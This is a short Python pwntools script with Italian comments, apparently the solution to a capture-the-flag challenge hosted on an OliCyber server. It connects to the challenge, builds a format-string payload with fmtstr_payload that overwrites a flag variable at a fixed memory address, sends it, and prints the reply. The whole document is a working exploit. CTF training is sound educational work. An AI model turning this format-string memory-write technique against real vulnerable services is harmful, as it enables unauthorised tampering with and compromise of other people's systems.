from pwn import *
context.arch = "amd64"  #Impostare context.arch è essenziale per assicurarsi che pwntools generi codice e gestisca dati compatibili con il binario che si sta cercando di attaccare

def main():
    conn = remote('formatted.challs.olicyber.it', 10305)
    
    print(conn.recvuntil(b"?\n"))  # "Hello, what's your name?"

    flag_addr = 0x40404c
    payload = fmtstr_payload(6, {flag_addr: 1}) #Questa funzione è essenziale per modificare il valore di una variabile avendo l'indirizzo di essa 

    conn.sendline(payload)
    print(f'payload: {payload.decode()}')

    response = conn.recvall()
    print(response.decode())

if __name__ == "__main__":
    main()
